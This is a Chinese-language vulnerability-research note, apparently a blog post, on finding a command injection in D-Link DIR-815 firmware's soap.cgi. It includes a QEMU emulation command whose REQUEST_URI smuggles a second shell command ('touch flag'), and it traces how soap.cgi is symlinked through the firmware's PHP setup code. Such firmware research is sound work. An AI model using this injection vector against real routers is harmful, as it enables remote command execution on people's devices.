使用Emtaint分析dir815路由器固件结果

为了调试，我们在/htdocs/web/创建cgibin的软连接soap.cgi，并创建var/run目录。
```
ln -s /htdocs/cgibin soap.cgi
```

需要先开启xmldb

```
sudo chroot . bin/sh
$ xmldb -n wrgnd08_dlob_dir815 -t
```

触发命令注入的命令如下，命令会创建一个flag文件。

```
sudo chroot . ./qemu-mipsel-static -E CONTENT_TYPE="text/xml" -E HTTP_SOAPACTION="a#a" -E REQUEST_URI="?service=aaa;touch flag;" -E REQUEST_METHOD="POST" -g 1234 /htdocs/web/soap.cgi
```

但原固件解包中并没有找到soap.cgi文件，因此该命令注入是否有机会通过web接口触发？

首先，soap.cgi是如何创建的？我通过grep来从文件系统中寻找有关soap.cgi的位置。

![](images/Pasted%20image%2020231124152759.png)

发现在/etc/services/HTTP/httpsvcs.php:133文件中执行了命令，创建了soap.cgi软连接。该文件中包含很多函数，执行该命令的函数为upnpsetup()。

```sh
function upnpsetup($name)
{
	...
	$vdir = "/var/htdocs/upnp/".$name;
	...
	if ($mkln > 0)
	{
		startcmd("ln -s /htdocs/cgibin ".$vdir."/soap.cgi");
		startcmd("ln -s /htdocs/cgibin ".$vdir."/gena.cgi");
	}
```

通过看FirmAE仿真的shell，相应目录下确实存在soap.cgi。

![](images/Pasted%20image%2020231124155348.png)

继续搜索调用upnpsetup()的地方。

![](images/Pasted%20image%2020231124153919.png)


## 参考
[记一次失败的漏洞挖掘过程 | ZIKH26's Blog](https://zikh26.github.io/posts/d3519884.html)